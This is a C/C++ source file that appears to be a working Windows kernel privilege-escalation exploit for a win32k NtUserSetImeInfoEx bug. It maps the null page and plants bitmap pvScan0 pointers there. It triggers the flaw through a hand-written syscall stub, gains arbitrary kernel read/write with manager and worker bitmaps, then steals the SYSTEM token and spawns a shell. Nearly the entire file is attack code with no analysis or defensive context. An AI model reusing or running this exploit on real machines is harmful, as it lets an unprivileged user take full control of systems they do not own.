
#include "payloads.h"


#ifdef _WIN64
extern "C" void NtUserSetImeInfoEx(PVOID tmp);
#else
__declspec(naked) void NtUserSetImeInfoEx(PVOID tmp)
{
	__asm
	{

		mov eax, 0x1226;
		mov edx, 0x7FFE0300;
		call dword ptr[edx];
		ret 4;
	}
}
#endif // DEBUG



int main()
{
	// trigger vuln
	// bp win32k!SetImeInfoEx
	// bp win32k!NtUserSetImeInfoEx
	// modify the pvscan0 of manager!
	HWINSTA hSta = CreateWindowStationW(0, 0, READ_CONTROL, 0);
	SetProcessWindowStation(hSta);

	BYTE buf[0x64 * 0x64 * 4];
	HBITMAP ManagerBitmap = CreateBitmap(0x64, 0x64, 1, 32, &buf);
	HBITMAP WorkerBitmap = CreateBitmap(0x64, 0x64, 1, 32, &buf);
	DWORD dwPID = GetCurrentProcessId();
	LogMessage(L_INFO, TEXT("dwPid is %d"), dwPID);
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
#ifdef _WIN64
	PPEB64 peb = GetProcessPEB(hProcess, dwPID);
	//__debugbreak();
	ULONG64 ManagerPvScan0 = GetPvScan0(peb, ManagerBitmap);
	ULONG64 WorkerPvScan0 = GetPvScan0(peb, WorkerBitmap);

	if (!MapNullPage()) {
		LogMessage(L_ERROR, TEXT("map null page error!"));
		exit(1);
}

	PVOID BaseAddr = (PVOID)0x000000000000000;
	//PVOID lptestReadAddress = (PVOID)ManagerPvScan0;
	ULONG lptestReadResult = NULL;
	*(PULONG64)((ULONG64)BaseAddr + 0x8 * 5) = WorkerPvScan0;
	*(PULONG64)((ULONG64)BaseAddr + 0x8 * 10) = ManagerPvScan0;
	LPVOID TrigerInput = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x160);
	if (!TrigerInput) {
		LogMessage(L_ERROR, TEXT("map TrigerInput error!"));
		exit(1);
	}
	*(PULONG64)TrigerInput = (ULONG64)WorkerPvScan0;
	*(PULONG64)((ULONG64)TrigerInput + 0x8) = 0x190;
	*(PULONG64)((ULONG64)TrigerInput + 0xc) = 0xaaaa;
	*(PULONG64)((ULONG64)TrigerInput + 0x10) = 0x6;
	*(PULONG64)((ULONG64)TrigerInput + 0x14) = 0x10000;
	*(PULONG64)((ULONG64)TrigerInput + 0x20) = 0x04800200;
	NtUserSetImeInfoEx((LPVOID)TrigerInput);
	LogMessage(L_INFO, TEXT("ManagerPvScan0 is %p"), ManagerPvScan0);
	BitmapArbitraryRead(ManagerBitmap, WorkerBitmap, (LPVOID)ManagerPvScan0, &lptestReadResult, 0x8);
	LogMessage(L_INFO, TEXT("lptestReadResult is %p"), lptestReadResult);
#else
	PPEB32 peb = GetProcessPEB(hProcess, dwPID);
	ULONG ManagerPvScan0 = GetPvScan0(peb, ManagerBitmap);
	ULONG WorkerPvScan0 = GetPvScan0(peb, WorkerBitmap);

	if (!MapNullPage()) {
		LogMessage(L_ERROR, TEXT("map null page error!"));
		exit(1);
	}

	PVOID BaseAddr = (PVOID)0x0000000;
	ULONG lptestReadResult = NULL;
	*(PULONG)((ULONG)BaseAddr + 0x4 * 5) = (ULONG)WorkerPvScan0;
	*(PULONG)((ULONG)BaseAddr + 0x4 * 11) = (ULONG)ManagerPvScan0;
	LogMessage(L_INFO, TEXT("ULONG ManagerPvScan0 is 0x%p"), (ULONG)ManagerPvScan0);
	LPVOID TrigerInput = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x15C);
	if (!TrigerInput) {
		LogMessage(L_ERROR, TEXT("map TrigerInput error!"));
		exit(1);
	}
	*(PULONG)TrigerInput = (ULONG)WorkerPvScan0;
	*(PULONG)((ULONG)TrigerInput + 0x4) = 0x190;
	*(PULONG)((ULONG)TrigerInput + 0x8) = 0xaaaa;
	*(PULONG)((ULONG)TrigerInput + 0xc) = 0x6;
	*(PULONG)((ULONG)TrigerInput + 0x10) = 0x10000;
	*(PULONG)((ULONG)TrigerInput + 0x18) = 0x04800200;
	NtUserSetImeInfoEx((PVOID)TrigerInput);
	LogMessage(L_INFO, TEXT("ManagerPvScan0 is %p"), ManagerPvScan0);
	BitmapArbitraryRead(ManagerBitmap, WorkerBitmap, (LPVOID)ManagerPvScan0, &lptestReadResult, 0x4);
	LogMessage(L_INFO, TEXT("lptestReadResult is %p"), lptestReadResult);


#endif

	
	StealToken(ManagerBitmap, WorkerBitmap, dwPID);
	PopShell();
	return 0;

	
}

